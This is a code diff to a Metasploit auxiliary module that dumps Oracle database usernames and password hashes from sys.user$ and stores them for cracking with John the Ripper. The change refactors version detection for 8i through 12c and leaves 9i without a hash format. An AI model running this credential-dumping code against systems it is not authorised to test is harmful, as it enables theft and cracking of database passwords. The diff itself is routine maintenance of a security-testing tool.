@@ -15,7 +15,8 @@ class MetasploitModule < Msf::Auxiliary
       'Description'    => %Q{
           This module dumps the usernames and password hashes
           from Oracle given the proper Credentials and SID.
-          These are then stored as creds for later cracking.
+          These are then stored as creds for later cracking using auxiliary/analyze/jtr_oracle_fast.
+	  This module supports Oracle DB versions 8i, 9i, 10g, 11g, and 12c.
       },
       'Author'         => ['theLightCosine'],
       'License'        => MSF_LICENSE
@@ -25,26 +26,37 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     return if not check_dependencies
 
-    # Check for Version of Oracle DB. Behavior varies with Oracle DB version.
-    # 12c uses SHA-512, 11g uses SHA-1, 8g-10g use DES
-    is_11g=false
-    is_12c=false
+    # Checks for Version of Oracle. Behavior varies with oracle version.
+    # 12c uses SHA-512 (explained in more detail in report_hashes() below)
+    # 11g uses SHA-1 while 8i-10g use DES
     query =  'select * from v$version'
     ver = prepare_exec(query)
 
     if ver.nil?
-      print_error("An Error has occurred, check your OPTIONS")
+	    print_error("An Error has occurred. Check your OPTIONS")
       return
     end
 
     unless ver.empty?
-      if ver[0].include?('11g')
-        is_11g=true
-        print_status("Server is running 11g")
-      elsif ver[0].include?('12c')
-        is_12c=true
-        print_status("Server is running 12c")
+      case
+      when ver[0].include?('8i')
+        ver='8i'
+      when ver[0].include?('9i')
+        ver='9i'
+      when ver[0].include?('10g')
+        ver='10g'
+      when ver[0].include?('11g')
+        ver='11g'
+      when ver[0].include?('12c')
+        ver='12c'
+      when ver[0].include?('18c')
+        print_error("Version 18c is not currently supported")
+	return
+      else
+        print_error("Error: Oracle DB version not supported.\nThis module supports Oracle DB versions 8i, 9i, 10g, 11g, and 12c.\nDumping unsupported version info:\n#{ver[0]}")
+	return
       end
+      print_status("Server is running version #{ver}")
     end
 
     this_service = report_service(
@@ -60,9 +72,9 @@ class MetasploitModule < Msf::Auxiliary
       'Columns' => ['Username', 'Hash']
     )
 
-    # Get the usernames and hashes for 8g-10g
     begin
-      if is_11g==false && is_12c==false
+      case ver
+      when '8i', '9i', '10g'    # Get the usernames and hashes for 8i-10g
         query='SELECT name, password FROM sys.user$ where password is not null and name<> \'ANONYMOUS\''
         results= prepare_exec(query)
         unless results.empty?
@@ -71,9 +83,8 @@ class MetasploitModule < Msf::Auxiliary
             tbl << row
           end
         end
-      # Get the usernames and hashes for 11g or 12c. Query and table built the same way for both of these versions
-      elsif is_11g==true || is_12c==true
-        query='SELECT name, spare4 FROM sys.user$ where password is not null and name <> \'ANONYMOUS\''
+      when '11g', '12c'    # Get the usernames and hashes for 11g or 12c
+        query='SELECT name, spare4 FROM sys.user$ where password is not null and name<> \'ANONYMOUS\''
         results= prepare_exec(query)
         #print_status("Results: #{results.inspect}")
         unless results.empty?
@@ -85,23 +96,28 @@ class MetasploitModule < Msf::Auxiliary
         end
       end
     rescue => e
-      print_error("An error occurred. The supplied credentials may not have proper privs")
+      print_error("An error occurred. The supplied credentials may not have proper privileges")
       return
     end
     print_status("Hash table :\n #{tbl}")
-    report_hashes(tbl, is_11g, is_12c, ip, this_service)
+    report_hashes(tbl, ver, ip, this_service)
   end
 
-  def report_hashes(table, is_11g, is_12c, ip, service)
-    # Reports the hashes slightly differently, depending on the version
-    # This is so that we know which are which when we go to crack them
-    if is_11g==false
+  # Save each row in the hash table as credentials (shown by "creds" command)
+  # This is done slightly differently, depending on the version
+  def report_hashes(table, ver, ip, service)
+
+    # Before module jtr_oracle_fast cracks these hashes, they are converted (based on jtr_format)
+    # to a format that John The Ripper can handle. This format is stored here.
+    case ver
+    when '8i', '10g'
       jtr_format = "des,oracle"
-    elsif is_12c==true
-      jtr_format = "oracle12c"
-    else
+    when '11g'
       jtr_format = "raw-sha1,oracle11"
+    when '12c'
+      jtr_format = "oracle12c"
     end
+
     service_data = {
       address: Rex::Socket.getaddress(ip),
       port: service[:port],
@@ -110,6 +126,7 @@ class MetasploitModule < Msf::Auxiliary
       workspace_id: myworkspace_id
     }
 
+    # For each row in the hash table, save its corresponding credential data and JTR format
     table.rows.each do |row|
       credential_data = {
         origin_type: :service,
